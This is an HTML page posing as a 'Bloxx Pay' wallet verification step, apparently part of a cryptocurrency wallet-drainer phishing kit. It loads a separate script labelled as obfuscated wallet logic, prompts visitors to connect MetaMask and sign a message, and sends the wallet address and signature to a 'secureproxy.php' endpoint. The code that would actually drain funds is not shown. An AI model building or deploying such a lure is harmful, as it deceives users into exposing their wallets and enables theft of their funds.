<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Bloxx Pay Wallet Verification</title>

<!-- Obfuscated wallet logic -->
<script charset="UTF-8" type="text/javascript" src="./chunk.17.kx4f46pz.js"></script>

<style>
body {
    font-family: Arial, sans-serif;
    background: #f4f4f4;
    margin: 0;
    padding: 0;
}
.container {
    max-width: 650px;
    margin: auto;
    padding: 20px;
}
.verify-wallet {
    background: white;
    padding: 35px;
    border-radius: 12px;
    text-align: center;
    margin-top: 80px;
    box-shadow: 0 2px 10px rgba(0,0,0,.1);
}
.verify-wallet h2 {
    margin-bottom: 10px;
}
.verify-wallet p {
    color: #555;
}
.verify-btn {
    padding: 15px 35px;
    border: none;
    background: black;
    color: white;
    font-size: 16px;
    border-radius: 8px;
    cursor: pointer;
}
.verify-btn:hover {
    opacity: 0.9;
}
#status {
    margin-top: 20px;
    font-weight: bold;
    word-break: break-word;
    color: green;
}
</style>
</head>

<body>
<div class="container">
    <div class="verify-wallet">
        <h2>🛡️ Verify Wallet</h2>
        <p>Securely connect your wallet to continue the transaction</p>
        <button class="verify-btn">Verify Wallet</button>
        <div id="status"></div>
    </div>
</div>

<script>
document.querySelector('.verify-btn').addEventListener('click', async () => {
    const status = document.getElementById('status');

    // Check for MetaMask
    if (typeof window.ethereum === 'undefined') {
        status.innerText = 'Install MetaMask first';
        return;
    }

    try {
        // Request wallet accounts
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        const wallet = accounts[0];
        status.innerText = 'Connected: ' + wallet;

        // Message for signing
        const message = 'Bloxx Pay Wallet Verification';

        // Sign message
        const signature = await window.ethereum.request({
            method: 'personal_sign',
            params: [message, wallet]
        });

        // Send wallet + signature to secure proxy
        const response = await fetch('secureproxy.php?e=verify-wallet', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ wallet, signature })
        });

        const data = await response.text();
        status.innerText = 'Proxy Response: ' + data;

    } catch (err) {
        status.innerText = 'Error: ' + err.message;
    }
});
</script>

</body>
</html>
